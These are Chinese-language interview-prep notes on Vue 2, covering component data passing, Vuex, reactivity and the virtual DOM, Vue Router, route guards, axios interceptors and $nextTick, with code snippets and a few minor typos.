面试的时候这么回答：要想使用element-ui，就要在main.js入口文件中使用`Vue.use(ElementUI)`。底层机制就是ElementUI中定义了`install`函数，在`install`函数内部，使用 `Vue.component()` 注册了大量的全局组件。这就是说我们能够在任何.vue文件中，不需要创、引、定，就可以直接使用`el-rage`、`el-slider`等等的原因。



![image-20220417144656441](F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第3天-案例和笔记》/markdown格式笔记/assets/image-20220417144656441.png)





### 面试题：如何实现自定义组件的v-model双向绑定？

你看人家element-ui中，很多东西都有`v-model`，比如`<el-rate v-model="a" />`很方便。

我们的自定义组件，也想有`v-model`。怎么办？



某个自定义组件想实现双向绑定`v-model`，那么：

- 从父组件要值：使用 `value` 这个特定的props
- 将值传回父组件：通过 `$emit('input', 值)` 将值传出去



即，`value` 和 `$emit('input', 值)`都是固定写法。

即，`v-model`等于 `value` 和 `input`。



比如我们要自定义一个“打分组件”，能够让爸爸用`v-model`。就是`<zkt-dafen v-model="a" />`



```html
<template>
    <div>
        <span 
            v-for="i in 5" 
            :key="i" 
            @click="$emit('input', i)"
        >
            {{value >= i ? '★' : '☆'}}
        </span>
    </div>
</template>

<script>
    export default {
        props: ['value']
    }
</script>
```



小小的遗憾：我们之前的`<PCAS />`组件不是双向绑定版本，而是：

```html
<PCAS :p="" :c="" :a="" :s="" @chooseDone="" />
```



你可以尝试自己把PCAS改为双向绑定版本：

```html
<PCAS v-model="myform.pcas" />
```





## 组件间数据传递（高频面试点）

###  父向子传递数据 - 用props

使用`props`，注意子组件要用`props`迎接一下。在`props`中，可以定义类型、默认值、是否必须。



比如，现在要迎接两个props，a和b，我们上课，挺不负责任的：

```js
props: ['a', 'b']
```

迎接的时候，可以定义类型：

```js
props: {
    a: String,
    b: Number
}
```



还可以设置默认值，如果爸爸没有传这个参数，那么就用默认值：

```js
  props: {
    a: String,
    b: {
      type: Number,
      default: 100,
    },
  },
```



还可以设置必填：

```
  props: {
    a: {
        required: true,
        type: String,
    },
    b: {
      type: Number,
      default: 100,
    },
  },
```

如果漏了a参数，那么会报错。



还可以更牛，自己写校验函数，比如希望b参数必须大于100：

```js
  props: {
    a: {
      required: true,
      type: String,
    },
    b: {
      type: Number,
      default: 100,
      validator: function (v) {
        return v >= 100;
      },
    },
  },
```



有兴趣同学可以看官网：

https://cn.vuejs.org/v2/guide/components-props.html#Prop-%E9%AA%8C%E8%AF%81



### 子向父传递数据 - 用$emit

使用`$emit(k, v)`，父组件用`@k="kHandler($event)"`处理。



### 面试题：怎样理解父子组件之间的单向数据流

`props`是只读的，这也被称为：*单向数据流*。



核心思想是：爸爸把`a`给儿子了，那么对a的更改，只允许爸爸做，因为a是爸爸的a，儿子不能改。儿子要改咋办，告诉爸爸，爸爸自己改。怎么告诉？`$emit()`。这样的好处，就是一目了然：

	- 一目了然能够看见爸爸给儿子什么变量了
	- 一目了然能够看见儿子拥有什么权利



```html
<Zi :a="a" @add="a += $event" @cheng="a *= $event" />
```

哦！我给儿子a了，并且儿子有能力增加、乘。不能减、不能除。



### 简单粗暴的父子数据传递 - $parent、$children、$ref

在子组件中，可以使用`{{$parent}}`或者`this.$parent`表示父组件，从而`{{$parent.a}}`得到父亲的a值。父组件，甚至不需要将`a`参数传给子组件，儿子可以直接用。所以，这种模式，挺简单粗暴的。颠覆了我们之前学习的`props`、`$emit`这一套。确实不美，但是也有实战价值。破坏了“一目了然”。儿子可以随便改父亲的`a`了。我们在开发的时候，不要主动用，讲这个知识的目的是，让你能够看懂其他同事写的。以及一些特殊业务(5分钟后讲)。

```html
<template>
  <div>
    我是子组件 {{ $parent.a }}
    <button @click="$parent.a++">按我a加1</button>
    <button @click="$parent.a = 0">按我a清0</button>
  </div>
</template>
```



<img src="F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第3天-案例和笔记》/markdown格式笔记/assets/image-20220417154949014.png" alt="image-20220417154949014" style="zoom:50%;" />

任何组件只有一个爸爸，所以`$parent`就是自己的唯一爸爸。



但是 `$children` 是数组。比如父组件中：

```js
alert(this.$children[0].m);
```

得到自己0号子组件的m值。谁是0号呀？按什么排序的呀？容易乱。

解决方法就是`$ref`。



父组件中，直接给子组件用ref命名：

```html
<Zi ref="erzi" />
```

然后父组件就能用：

```js
alert(this.$refs.erzi.m)
```

直接*“捞”*到子组件的m值。而子组件没有`$emit()`。简单粗暴，硬捞。



父子组件通信：

- 方法1：props + $emit 那一套
- 方法2： $parent、$ref 硬捞



比如我们讲一个“分布表单”的案例，每一步的表单都是子组件，但是“下一步“按钮是爸爸的。

此时子组件，没有机会、没有地方写`$emit`。此时父子组件数据传递，无法使用方法1。怎么办，用方法2！

硬捞！

<img src="F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第3天-案例和笔记》/markdown格式笔记/assets/image-20220417162900440.png" alt="image-20220417162900440" style="zoom:50%;" />





### 兄弟之间数据传递 - 通过父亲

比如我们的“二手车“案例，想把筛选器部分、表格部分都分别设置为子组件。

<img src="F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第3天-案例和笔记》/markdown格式笔记/assets/image-20220417172642343.png" alt="image-20220417172642343" style="zoom: 33%;" />



父组件：

```js
data（） {
	return {
       	 // 大儿子要用的数据
		nowColor: ['红', '蓝', '绿'],
         // 二儿子要用的数据
		results: []
	}
},
methods: {
  	async loadData() {
        const data = await axios.get('/api/serarch?color=' + this.nowColor.join(','));
        // 改变了二儿子的数据
        this.results = data.data;
    }  
},
watch: {
    // 当大儿子把nowColor值改变了，那么就要发出Ajax，而Ajax的结果，就改变了二儿子的数据
	nowColor() {
		this.page = 1;
		this.loadData();
	}
}
```

只需要给儿子信息，儿子通过父亲的数据，进行所谓的“兄弟之间传递”：

```html
<Shaixuanqi :nowColor="nowColor" @changeColor="nowColor=$event" />
<Biaoge :results="results" />
```



梳理一下，当你的Shaixuanqi组件（哥哥），里面用户把颜色改了，那么此时哥哥就会`$emit`一个事件出来，改变爸爸的nowColor。而爸爸的`nowColor`被watch了，就Ajax发出了，就改变了爸爸自己的`results`。而恰好`results`是二儿子的props，引发了二儿子的表格数据视图改变。

所以，你说哥哥和弟弟数据传递了，不对。没传递。是通过爸爸。



### 兄弟之间数据传递 - 用vue-bus

 vue-bus利用了一个机制：任何绑定到 `Vue.prototype` 上的值，都能被**所有**组件访问。

比如，我们在 `main.js` 文件，`new Vue`之前，加上：

```js
Vue.prototype.m = 123;
```

那么任何组件，可以无脑用这个m值：

```html
<template>
	<div>{{m}}</div>
</template>
```

这个m不是data、不是methods、不是computed，但是就是能`{{m}}` ，因为它写在了Vue的原型上。

<img src="F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第3天-案例和笔记》/markdown格式笔记/assets/image-20220417170349682.png" alt="image-20220417170349682" style="zoom:50%;" />



但是，视图不更新，怎么办呢？`<button @click="m++">按我</button>`。阿里巴巴程序员，鬼才般的想到了一个方法：*在Vue.prototype上绑定一个新的Vue实例*。

```
Vue.prototype.bus = new Vue({
	data() {
		return {
			m: 123
		}
	}
});
```

这样，我们组件`{{bus.m}}` 使用这个m了，并且按钮`<button @click="bus.m++">按我</button>`，能够引发视图更新。



*这就是bus的机理：为了确保数据能够引发视图更新，它是一个Vue实例，这个实例绑定到了Vue的原型上。*



但是我们不希望这个新Vue实例上面data太多，能不能没有data，也能够传递数据呢？

那么列用`$emit`、`$on` 监听emit特性就行。



哥哥：

```html
<button @click="bus.$emit('info', '穿秋裤')">传信息</button>
```



弟弟：

```js
created() {
    this.bus.$on('info', v => {
        alert('收到了哥哥的信息' + v);
    });
}
```





### 兄弟之间数据传递 - 用vuex

*重要提示：《Vuex可预测状态容器》这个录播视频，一定要看哦！* 4月1日上午9点上线的。如果找不到，请立即练习晓言老师。

<img src="F:/Web前端/BOSS直聘课程/学习资料/面试辅导/《面试题辅导第3天-案例和笔记》/markdown格式笔记/assets/image-20220417130449060.png" alt="image-20220417130449060" style="zoom:33%;" />







# 面试题辅导第4天 - 笔记

2022年4月20日 星期三



## Vuex

*重要提示：《Vuex可预测状态容器》这个录播视频，一定要看哦！* 4月1日上午9点上线的。如果找不到，请立即联系晓言老师。

<img src="F:\Web前端\BOSS直聘课程\学习资料\面试辅导\《面试题辅导第4天-案例和笔记》\markdown格式笔记\assets\image-20220417130449060-16501891693373.png" alt="image-20220417130449060" style="zoom:33%;" />

### 顺一下这个Vuex知识点

老师帮你捋顺一下这个Vuex知识点。

首先创建项目，`vue create 项目名字`，一定要手动选择vuex栈。



store/index.js这个文件就是定义“全局数据”的。store翻译为“仓库”。

```js
import Vue from 'vue'
import Vuex from 'vuex'

Vue.use(Vuex)

export default new Vuex.Store({
  state: {
    a: 123
  }
});
```

这样，所有组件，都可以用`{{$store.state.a}}`得到这个值。

<img src="F:\Web前端\BOSS直聘课程\学习资料\面试辅导\《面试题辅导第4天-案例和笔记》\markdown格式笔记\assets\image-20220420194057111.png" alt="image-20220420194057111" style="zoom:50%;" />



数据怎么更改呢？下面的代码可以执行：

```html
<button @click="$store.state.a++">按我加1</button>
```

但是，这不是Vuex推荐的。



我们要在store/index.js这个文件中，在`mutations`中定义函数，所有对`state`的改变都要放到`mutations`中。

```js
import Vue from 'vue'
import Vuex from 'vuex'

Vue.use(Vuex);

export default new Vuex.Store({
  state: {
    a: 123
  },
  // 改变，所有对state的改变，都要放到mutations中
  mutations: {
    add(state) {
      state.a ++;
    },
    minus(state) {
      state.a --;
    }
  }
});
```

组件用 `$store.commit('add') `这样的写法，触发mutations。



这样一来，就能达到“可预测状态“的目的。所有可能对state的改变，都明明白白、清清楚楚的写在了mutations中。可以一目了然的看出来，这个state将来可能会发生的变化。

所以Vuex叫做可预测状态容器。



### 组件数据传递大总结

- 父向子
  - 自定义`props`，子组件要用`props`迎接，注意`props`只读。
  - 子组件可以直接 `this.$parent.a` 得到父组件的值。
- 子向父
  - 子组件`$emit(k, v)`，父组件用`<Zi @k="kHandler($event)" />`。
  - 父组件可以直接给子组件加一个ref属性，然后`this.$refs.xx.a`就能直接捞到儿子的值。
- 兄弟
  - 通过父组件。上节课的案例，筛选器拆组件的案例，父组件有一个属性`nowColor`传给了子组件1，有一个属性`results`传给了子组件2，此时两个兄弟互不通信。但是通过父亲，就能实现nowColor改变、results就变。
  - 通过bus。bus是一个绑定在`Vue.prototype`上的另一个全新Vue实例。兄弟组件通过`bus.$emit()`和`bus.$on()`传递数据。
- 任意传递
  - Vuex：说白了就是把数据放到了全局，是一个可预测状态容器（predictable state container），只能调用`mutations`中的函数改变`state`。主要用来存储一些用户的登录数据。



### Vuex常见面试题

**Vuex是什么？**

Vuex是Vue官方推出的**可预测状态容器**。它允许将数据放到项目的**“全局”**，所有组件都能轻松访问，是最优雅的组件之间数据传输的解决方案。比如，我们把Vuex中定义`state`中`a`的值是123，那么在任何组件中都可以使用 `$store.state.a` 来访问这个值。为了改变state的值，要用 `commit()` 来调用`mutations  ` 中的函数。



**什么是“可预测状态”**

所有对 `state` 的改变，都要写到 `mutations` 中，组件使用 `commit()` 来调用`mutations  ` 中的函数。这样做的好处就是可以一目了然的看出 `state` 会做出何种改变，并且可以让数据以**“单向数据流”**的形式进行。



**如何处理异步？**

在`actions`中定义异步函数，这个异步函数在组件中用`dispatch`触发。在异步函数中可以发出Ajax。Ajax返回后，可以调用`commit`来更改`state`。

（异步这个知识点，视频中讲解了，没看的同学赶紧看）



store/index.js：

```js
import Vue from 'vue';
import Vuex from 'vuex';
import axios from 'axios';

Vue.use(Vuex);

export default new Vuex.Store({
  state: {
    a: 123,
    news: []
  },
  // 改变，所有对state的改变，都要放到mutations中
  mutations: {
    add(state) {
      state.a++;
    },
    minus(state) {
      state.a--;
    },
    changeNews(state, { news }) {
      state.news = news;
    }
  },
  // 异步
  actions: {
    async loadNews({ commit }) {
      const data = await axios.get('http://www.zkt-it.com:5050/news');

      commit('changeNews', { news: data.data });
    }
  }
});

```

组件：

```html
<button @click="$store.dispatch('loadNews')">按我拉取新闻</button>
```



即：

- commit 对应 mutations，同步

- dispatch  对应 actions，异步



**Vuex中的getters是什么？**

Vuex 允许我们在 store 中定义“getters”，用来定义state的**派生状态**。



getters和computed非常类似，定义的时候是函数，但是用的时候不能加圆括号。

```js
import Vue from 'vue';
import Vuex from 'vuex';
import axios from 'axios';

Vue.use(Vuex);

export default new Vuex.Store({
  state: {
    a: 123,
    news: []
  },
  getters: {
    liangbei(state) {
      return state.a * 2;
    }
  }
});
```

用的时候：

```html
<h1> {{$store.getters.liangbei}} </h1>
```







## Vue底层原理面试题（高频面试点）

*这部分内容就是典型的“面试造火箭，工作拧螺丝”。千万别纠结，简单了解，能说出关键词即可！*

*真理：了解总比不了解好。*



### 面试题：什么是MVVM？

数据变化，视图自动变化。M（model，数据），V（view，视图），view-model（视图模型）。



### 面试题：Vue的MVVM实现机理

> 这个面试题通常是这样的3个问题：
>
> “Vue是怎么实现MVVM的？”
>
> ”Vue是底层怎么实现v-model的？“
>
> “Vue是如何实现数据响应式的？”



此时，面试官就是在问**Vue的MVVM实现机理**，说白了就是：

***Vue是如何实现数据变化，视图就自动变化的呢？***



Vue2实现MVVM，是通过JavaScript自带的一个函数 `Object.defineProperty()`，这个函数可以进行**“数据劫持”**。一旦这个对象的属性值变化了，就会触发setter，从而Vue就可以进一步渲染视图了。

```js
var _a = data.a;
Object.defineProperty(data, 'a', {
    get() {
        return _a;
    },
    set(v) {
        _a = v;
        // 关键语句，让h1中的内容实时和data.a相等
        h1.innerHTML = data.a;
    }
});
```



### 面试题：Vue的“依赖收集”（不常考，今后有空详细展开讲）

- Observer监听器：对数据对象进行遍历，包括子属性对象的属性，利用 Object.defineProperty() 对属性都加上 setter 和 getter。这样的话，给这个对象的某个值赋值，就会触发 setter，那么就能监听到了数据变化。
- Compile解析器：解析 Vue 模板指令，将模板中的变量都替换成数据，然后初始化渲染页面视图，并将每个指令对应的节点绑定更新函数，添加监听数据的订阅者，一旦数据有变动，收到通知，调用更新函数进行数据更新。
- Watcher订阅者：Watcher 订阅者是 Observer 和 Compile 之间通信的桥梁 ，主要的任务是订阅 Observer 中的属性值变化的消息，当收到属性值变化的消息时，触发解析器 Compile 中对应的更新函数。
- Dep订阅器：订阅器采用 发布-订阅 设计模式，用来收集订阅者 Watcher，对监听器 Observer 和 订阅者 Watcher 进行统一管理。



有兴趣的同学建议看一篇掘金的文章：https://juejin.cn/post/6844903903822086151

*建议这题主动放弃掉，太难了。NodeJS课，我们给大家展开了讲。*



Vue3是使用ES8新增的 `Proxy` 来实现数据劫持。



### 面试题：Vue的挂载

第一次调用Vue时，要用new来调用。`el`参数表示要将Vue程序挂载到哪个盒子中。即，Vue运行在哪个盒子中。

```js
new Vue({
    el: '#app',
    data: {
        a: 4
    },
    methods: {
        add() {
            this.a++;
        }
    }
});
```



### 面试题：什么是虚拟DOM？

为了比对DOM发生了什么变化，如果用DOM的手段进行，则非常耗费性能。比如我问你：

```html
<ul>
    <li>A</li>
    <li class="cur">B</li>
    <li>C</li>
    <li>D</li>
</ul>
```

和

```html
<ul>
    <li>A</li>
    <li class="cur">B</li>
    <li>C</li>
    <li>D</li>
    <li>E</li>
    <li>F</li>
</ul>
```

有什么区别？如果用DOM方法进行比较，则势必要用 `getElementsByTagName()` 还有`innerText`等DOM方法、属性进行大量的比较，耗费CPU和内存。

所以，***Vue内部采用“虚拟DOM”，来比对DOM发生的变化。***

***虚拟DOM就是普通JS对象***：

```js
{
    tag: 'ul',
    children: [
        { tag: 'li', text: 'A' },
        { tag: 'li', text: 'B', data: {'class': 'cur'} },
        { tag: 'li', text: 'C' },
        { tag: 'li', text: 'D' }
    ]
}
```



```js
{
    tag: 'ul',
    children: [
        { tag: 'li', text: 'A' },
        { tag: 'li', text: 'B', data: {'class': 'cur'} },
        { tag: 'li', text: 'C' },
        { tag: 'li', text: 'D' },
        { tag: 'li', text: 'E' },
        { tag: 'li', text: 'F' }
    ]
}
```

比对JS对象和JS对象的差别，要比比对DOM和DOM之间的差别简单很多。



小总结：

- 虚拟DOM就是普通的JS对象、数组，就是一层一层的children、children……
- 虚拟DOM生而为比较，比较两个虚拟DOM的差别，要比比对两个真实DOM的差别代价小。



如何体验虚拟DOM呢？在`new Vue()`时，如果书写`render`函数，就表示要手动设置Vue挂载元素内部显示的数据。`render`函数提供了一个参数，习惯上用`h`表示，叫做`h函数`。实际上，`h`函数就是 `createElement` 创建元素的简写。

h函数可以创建出虚拟节点，而`render()`函数一旦`return`一个虚拟节点树，这些虚拟节点就会变为真实的DOM节点上树。

```js
new Vue({
    el: '#app',
    render(h) {
        return h('ul', [
            h('li', 'A'),
            h('li', { 'class': 'cur' }, 'B'),
            h('li', 'C'),
            h('li', 'D'),
        ]);
    }
});
```

虚拟DOM应知应会：

- 虚拟DOM就是用普通JS对象来表示DOM结构；
- 虚拟DOM的目的是结合DIFF算法快速比对DOM的差别；
- 虚拟DOM的常见属性有tag、data、children、text；
- Vue中的h函数可以创建虚拟节点，render()中可以直接让虚拟节点上树。



### 感受DIFF算法

*以最小的代价进行视图更新。*

**要让Vue聪明。**



我们先感受一下DIFF算法。要使用下面这两个“武器“：

```js
// 提炼h函数
let h = vm.$createElement;

// 使用最小量算法更新节点
vm._update(新虚拟DOM);
```



你看，Vue就是这么聪明：

![image-20220420212347082](F:\Web前端\BOSS直聘课程\学习资料\面试辅导\《面试题辅导第4天-案例和笔记》\markdown格式笔记\assets\image-20220420212347082.png)



现在我们来探究一下key这个东西的用途：

**key是自然数序号：**

![image-20220420213703139](F:\Web前端\BOSS直聘课程\学习资料\面试辅导\《面试题辅导第4天-案例和笔记》\markdown格式笔记\assets\image-20220420213703139.png)



**用id当做key：**

![image-20220420213814247](F:\Web前端\BOSS直聘课程\学习资料\面试辅导\《面试题辅导第4天-案例和笔记》\markdown格式笔记\assets\image-20220420213814247.png)



DIFF算法总结：

1、只进行同层比较，不同层的，不比较；

2、`key`属性非常有用，它决定了最小量更新如何进行。在数据排序有改变的业务中（比如拖拽排序），`key`必须尽量用数据`id`来设置，而不要用`index`来设置。因为`index`会完全更改所有节点内容，而如果用`id`来做`key`，会移动节点，效率更高；





### 面试题：key有什么用？

 key是服务于Vue的最小量更新DIFF算法的。它决定了最小量更新如何进行。在数据排序有改变的业务中（比如拖拽排序），`key`必须尽量用数据`id`来设置，而不要用`index`来设置。因为`index`会完全更改所有节点内容，而如果用`id`来做`key`，会移动节点，效率更高；



（脑海中要用今晚的画面）**比如A、B、C、E、F要变为E、F、A、B、C。那么：**

	- 如果你用index当做key，5个节点内部的文字都会变化，而节点本身位置不变；
	- 如果你用id当做key，5个节点内部的文字都不变化，而节点本身位置改变了。此时效率更高。





### 面试题：DIFF算法更新子节点的“4指针策略”（精彩，不用写，但是要会说）

Vue源码中，`updateChildren` 就是DIFF算法最精华的函数，它借鉴了snabbdom库。snabbdom库是全球第一个提出虚拟DOM概念的库。

`updateChildren` 内部使用了4个指针：旧前、旧后、新前、新后。我们可以简单阅读源码，很轻松能够知道4指针是如何运作的。

下面四步操作会反复进行：

- 旧前和新前比，如果相同，则两个指针后移；
- 旧后和新后比，如果相同，则两个指针前移；
- 旧前和新后比，如果相同，则移动旧前节点到旧后指针后，旧前指针后移，新后指针前移；
- 旧后和新前比，如果相同，则移动旧后节点到旧前指针前，旧后指针前移，新前指针后移；
- 如果都没有命中，那么就看看老节点有没有新前指向的之间，如果有就把它挪到旧前指针前，新前指针后移；如果没有，就创建节点，并插入到旧前指针前，新前指针后移。



当任何一个**前指针**跑到了**后指针**后，那么上述比对暂停，然后：

- 如果旧前跑到了旧后后面，那么**新增**新前指针和新后指针之间的全部节点；
- 如果新前跑到了新后后面，那么删除旧前指针和旧后指针之间的全部节点。



这一部分大家重新看一下直播视频~要能够大致和面试官说出来。





### 面试题：你写的HTML，是如何变为虚拟DOM的？

我们写的毕竟是HTML呀，那Vue是如何把我们的HTML变为虚拟DOM的？

答：Vue源码9637行，`function parse` 函数就是干这个事情的。这个函数可以将HTML字符串，变为抽象语法树（AST，abstract structure tree）。AST本质上就是虚拟DOM，只不过一些属性名不一样。

这个`parse`函数的机理，是利用“栈”算法思维。



*这个题目不删，但是今天不讲了。我们讲算法复习的时候，“栈”专题中，讲这个题目。*





# 面试题辅导第5天 - 笔记

2022年4月21日 星期四



## Vue-Router

注意：配置路由，工作中一定是组长的活儿。但是面试常问，因为需要所有程序员都了解路由的基本运行机制。



### 路由的基本使用

起一个带有vue-router的项目。`vue create 项目名称`，要把Router选中：

<img src="F:\Web前端\BOSS直聘课程\学习资料\面试辅导\《面试题辅导第5天-案例和笔记》\markdown格式笔记\assets\image-20220421193336565.png" alt="image-20220421193336565" style="zoom:33%;" />

项目文件夹中，就有了一个router的文件夹：

<img src="F:\Web前端\BOSS直聘课程\学习资料\面试辅导\《面试题辅导第5天-案例和笔记》\markdown格式笔记\assets\image-20220421194309512.png" alt="image-20220421194309512" style="zoom:50%;" />

进行一些路由配置：

```js
import Vue from 'vue';
import VueRouter from 'vue-router';

import Yinyue from '../Yinyue.vue';
import Xinwen from '../Xinwen.vue';

// 使用VueRouter插件
Vue.use(VueRouter);

const routes = [
  {
    path: '/yinyue',
    component: Yinyue
  },
  {
    path: '/xinwen',
    component: Xinwen
  }
];

const router = new VueRouter({
  routes
})

export default router;
```



注意，App.vue必须要放置一个小电视`<router-view>`：

```vue
<template>
  <div>
    <h1>我是App.vue</h1>

    <!-- 小电视 -->
    <router-view />
  </div>
</template>
```



这样：

`http://127.0.0.1:8080/#/yinyue` 音乐页面

`http://127.0.0.1:8080/#/xinwen` 新闻页面



<img src="F:\Web前端\BOSS直聘课程\学习资料\面试辅导\《面试题辅导第5天-案例和笔记》\markdown格式笔记\assets\image-20220421194651553.png" alt="image-20220421194651553" style="zoom: 50%;" />

### 子路由

`children` 表示定义子路由：

```js
const routes = [
  {
    path: '/yinyue',
    component: Yinyue,
    children: [
      {
        path: 'gudian',
        component: Gudian
      },
      {
        path: 'liuxing',
        component: Liuxing
      }
    ]
  },
  {
    path: '/xinwen',
    component: Xinwen
  }
];
```



谁有子路由，谁放小电视

```html
<template>
    <div style="background: purple; color: white;">
        <h1>我是音乐</h1>

        <!-- 小电视。谁有子栏目，谁放小电视。 -->
        <router-view />
    </div>
</template>
```



此时URL就是有二级斜杠了：`http://127.0.0.1:8080/#/yinyue/gudian`

<img src="F:\Web前端\BOSS直聘课程\学习资料\面试辅导\《面试题辅导第5天-案例和笔记》\markdown格式笔记\assets\image-20220421195222544.png" alt="image-20220421195222544" style="zoom:50%;" />

### 链接跳转

使用`<router-link>`标签来当做`a`标签。必须有一个`to`属性，一般都是往指定名称上跳转：

```html
<!-- 超级链接 -->
<router-link :to="{name: '新闻'}">看新闻</router-link>
<router-link :to="{name: '音乐'}">听音乐</router-link>
```

<img src="F:\Web前端\BOSS直聘课程\学习资料\面试辅导\《面试题辅导第5天-案例和笔记》\markdown格式笔记\assets\image-20220421200023315.png" alt="image-20220421200023315" style="zoom:50%;" />

路由清单中就要有name：

```js
const routes = [
  {
    path: '/yinyue',
    component: Yinyue,
    name: '音乐',
    children: [
      {
        path: 'gudian',
        component: Gudian,
        name: '古典'
      },
      {
        path: 'liuxing',
        component: Liuxing,
        name: '流行'
      }
    ]
  },
  {
    path: '/xinwen',
    component: Xinwen,
    name: '新闻'
  }
];
```



### JS跳转

比如我现在不想做`a`标签（`<router-link>`标签），而是想做一个按钮。那么就可以写`$router.push()` 这条语句。

```html
<button @click="$router.push({ 'name': '新闻' })">看新闻</button>
```



### 带参数跳转

可以用`:`定义参数路由（一定要记住这个冒号）

```js
  {
    path: '/xinwen',
    component: Xinwen,
    name: '新闻',
    children: [
      {
        path: 'xinwenxiangqing/:id',  // 注意这里，有:id
        name: '新闻详情',
        component: Xinwenxiangqing
      }
    ]
  }
```



那么URL就可以：

```
http://127.0.0.1:8080/#/xinwen/xinwenxiangqing/3
http://127.0.0.1:8080/#/xinwen/xinwenxiangqing/4
http://127.0.0.1:8080/#/xinwen/xinwenxiangqing/999
```



新闻详情组件，就可以用`this.$route.params.id`来得到路由的动态参数。从而可以发出Ajax。



超级链接中，用params描述这个参数：

```html
<ul>
    <li v-for="i in 9" :key="i">
    	<router-link :to="{ 'name': '新闻详情', 'params': { 'id': i } }">看第{{ i }}篇新闻</router-link>
    </li>
</ul>
```



### 面试题：路由的两种模式（硬背）

- **hash模式**：URL中有`#`号，优点是不需要服务器的支持；缺点是老浏览器会有无法返回、前进的问题（高级浏览器没任何问题，所以hash模式非常常见）。
- **history模式**：URL中没有`#`号，优点是路由更美观，返回、前进没有问题；*缺点是需要服务器支持，比如要配置Nginx反向代理*。

<img src="F:\Web前端\BOSS直聘课程\学习资料\面试辅导\《面试题辅导第5天-案例和笔记》\markdown格式笔记\assets\image-20220421193359888.png" alt="image-20220421193359888" style="zoom: 33%;" />

国内的公司都用hash模式。



### 面试题：router-link的常见属性

帖子：

https://blog.csdn.net/lixinyi0622/article/details/107206218/



- to属性，跳转到哪里，`:to="{name:'音乐'}"`
- tag属性，`<router-link>`变为什么标签，`<router-link tag="button" :to="">看新闻</router-link>`
- active-class属性，当前激活的超级链接的类名
- exact-active-class属性，当前的“精确”激活的类名，到子视图中就不激活了
- event属性，当用户进行什么操作的时候激活链接，`<router-link event="mouseenter" >`
- replace属性，不产生历史记录`<router-link :replace="true"></router-link>`
- append属性，添加基路径，`<router-link :append="true"></router-link>`



### 面试题：路由懒加载（高频面试题）

当用户不看某一个页面、板块的时候，就不要加载这部分的Vue程序（js）。

<img src="F:\Web前端\BOSS直聘课程\学习资料\面试辅导\《面试题辅导第5天-案例和笔记》\markdown格式笔记\assets\image-20220421205940540.png" alt="image-20220421205940540" style="zoom:50%;" />



解决方法，就是定义路由的时候，`component`属性用函数写，而不是一个组件对象：

```
  {
    path: '/xinwen',
    component: resolve => require(['../views/xinwen/Xinwen.vue'], resolve),
    name: '新闻',
    children: [
      {
        path: 'xinwenxiangqing/:id',
        name: '新闻详情',
        component:resolve => require(['../views/xinwen/Xinwenxiangqing.vue'], resolve),
      }
    ]
  }
```



### keep-alive（高频面试点）

`<keep-alive>`是Vue的内置组件，能在组件切换过程中将状态保留在内存中，防止重复渲染DOM。比如，我们在路由小电视`<router-view />`外面包裹`<keep-alive>`，那么组件切换来、切换回，组件的data不丢失。

```html
<!-- 小电视 -->
<keep-alive>
	<router-view />
</keep-alive>
```



注意，当组件外层有`<keep-alive>`时，内部组件就能够用`activated`和`deactivated`生命周期。表示激活、不激活。

```js
activated() {
	alert('我激活了')
},
deactivated() {
	alert('我不激活了')
}
```



至此，我们已经学习完毕了所有的生命周期11个：

- beforeCreate、created
- beforeMount、mounted
- beforeUpdate、updated
- beforeDestroy、destroyed
- activated、deactivated：只有外部被`<keep-alive>`包裹时，才生效，
- errorcapture：遇见错误了



### 面试题：保持滚动条位置

这个就是keep-alive和activated、deactivated的配合的常见应用：

```js
activated() {
	document.documentElement.scrollTop = this.scrollTop;
},
deactivated() {
	// 在state中记录滚动条的位置，因为state会keep-alive啊
	this.scrollTop = document.documentElement.scrollTop;
},
```



### 面试题：路由鉴权和路由守卫

*一定要看录播视频《Vue登录注册和路由鉴权》*，跟不跟着做都无所谓，但是要看一个眼熟。

**路由鉴权：鉴别用户是否有访问此路由的权限。**



路由配置中，要加一个meta：

```json
{
    path: '/goods/goods-list',
    name: '商品列表',
    // 加鉴权
    meta: {
        checkAuthority: true
    },
    component: () => import('@/views/goods/GoodsList.vue'),
},

```



要使用*路由守卫*的前置守卫，`beforeEach()` 在路由每一次跳转时，都会执行。路由守卫厉害的地方，在于`next()`，只有调用`next()`就表示通过、放行。


```js
// 路由守卫。前置守卫。当路由跳转的时候，都会执行。
router.beforeEach((to, from, next) => {
  // 如果你要去的地方，meta上有没有checkAuthority，如果有，进行Ajax处理
  if (to.meta.checkAuthority) {
    var pw = prompt('请输入一个密码，只有密码是123才能进入');
    if (pw == '123') {
      next();
    } 
  } else {
    // 调用next表示放行
    next();
  }
});
```

路由也有后置守卫`afterEach()`，`afterEach()`没有什么用，也没有next参数。



## axios拦截器

*一定要看录播视频《Vue登录注册和路由鉴权》*

**每一次axios请求发出、收到响应之前，进行一些操作，就叫做拦截器**。因为是在请求发出之前做的，所以就叫做拦截器。



拦截器有两种：

	- 请求拦截器 `axios.interceptors.request.use()`
	- 响应拦截器 `service.interceptors.response.use()`



*响应拦截器有大用途：检查响应是不是401/403状态码。401/403状态码表示未授权，此时就要将页面跳转到login页面。*

```js
// response 拦截器
service.interceptors.response.use(
  response => {
    // if the custom code is not 20000, it is judged as an error.
    if (response.status !== 200) {
      Message({
        message: 'Ajax错误',
        type: 'error',
        duration: 5 * 1000
      });

      return Promise.reject(new Error('Ajax错误'));
    } else {
      return response.data;
    }
  },
  error => {
    // *****************************************
    // 下面这些是新语句
    if (error.response.status == 401) {
      // 强制跳转到login即可
      router.push('/login');
    }
    // *****************************************
    console.log('err' + error);
    Message({
      message: error.message,
      type: 'error',
      duration: 5 * 1000
    });
    return Promise.reject(error);
  }
);
```



## $nextTick()

下一刻执行。我们遇见的：当弹出层出现，清空所有的字段

```
this.dialogVisible = true;
this.nextTick(() => {
	this.$refs.myform.clearFields();
});
```

因为data的改变可以看做是“异步的”，需要一定的时间。所以dialogVisible变量设置为true之后，不会立即产生表单。所以`this.$refs.myform`就是undefined。Vue内置了$nextTick()表示下一刻，此时就能够解决data是”异步的“、需要时间的问题。本质：data有结算机制，所有语句一起结算。



## 面试题：如何拓展数组功能（高频面试题）

数组能够`.push()`、`.splice()` 等等。但是不能`.wangqin()`。

此时可以在`Array.prototype`上绑定函数，这样所有的数组就都能打点儿了。

